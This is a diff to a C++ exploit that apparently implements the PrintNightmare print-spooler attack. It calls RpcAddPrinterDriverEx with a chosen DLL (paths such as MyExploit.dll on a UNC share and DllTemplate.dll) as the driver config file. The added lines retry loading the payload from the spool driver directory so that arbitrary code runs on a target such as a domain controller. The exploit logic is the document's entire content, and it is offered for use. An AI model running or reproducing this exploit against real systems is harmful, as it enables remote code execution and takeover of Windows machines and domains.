@@ -52,7 +52,7 @@ RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE* binding_handle)
 			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_DELEGATE;
 			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_IGNORE_DELEGATE_FAILURE;
 			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_DYNAMIC;
-
+			
 			_SEC_WINNT_AUTH_IDENTITY_A identity;
 			identity.Domain = NULL;
 			identity.DomainLength = 0;
@@ -105,11 +105,14 @@ int wmain(int argc, wchar_t* argv[])
 
 	DRIVER_INFO_2 info;
 	info.cVersion = 3;
-	info.pConfigFile = (LPWSTR)L"C:\\Windows\\System32\\kernelbase.dll";
+	//info.pConfigFile = (LPWSTR)L"C:\\Windows\\System32\\kernelbase.dll";
+	info.pConfigFile = (LPWSTR)L"C:\\Release\\DllTemplate.dll";
 	//info.pDataFile = (LPWSTR)L"\\\\192.168.228.1\\test\\MyExploit.dll";
 	info.pDataFile = src_exp_path;
 	
-	info.pDriverPath = (LPWSTR)L"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_19a3fe50fa9a21b6\\Amd64\\UNIDRV.DLL";
+	//info.pDriverPath = (LPWSTR)L"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_19a3fe50fa9a21b6\\Amd64\\UNIDRV.DLL";
+	//info.pDriverPath = (LPWSTR)L"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_857cc9be9812fff6\\Amd64\\UNIDRV.DLL";
+	info.pDriverPath = (LPWSTR)L"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_18b0d38ddfaee729\\Amd64\\UNIDRV.DLL";
 	info.pEnvironment = (LPWSTR)L"Windows x64";
 	info.pName = (LPWSTR)L"123";
 	RPC_BINDING_HANDLE handle;
@@ -165,6 +168,17 @@ int wmain(int argc, wchar_t* argv[])
 		wprintf(L"[*] Try to load %s - ErrorCode %d\n", container_info.DriverInfo.Level2->pConfigFile,hr);
 		if (hr == 0) return 0;
 
+
+		wsprintf(dest_exp_path, L"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\%s", exp_name);
+		container_info.DriverInfo.Level2->pConfigFile = dest_exp_path;
+		hr = RpcAddPrinterDriverEx(handle,
+			dc_path,
+			&container_info,
+			APD_COPY_ALL_FILES | 0x10 | 0x8000
+		);
+		wprintf(L"[*] Try to load %s - ErrorCode %d\n", container_info.DriverInfo.Level2->pConfigFile, hr);
+		if (hr == 0) return 0;
+
 	}
 	RpcExcept(1)
 	{
@@ -173,10 +187,6 @@ int wmain(int argc, wchar_t* argv[])
 	}
 	RpcEndExcept
 
-
-	
-
-	
 }
 
 extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
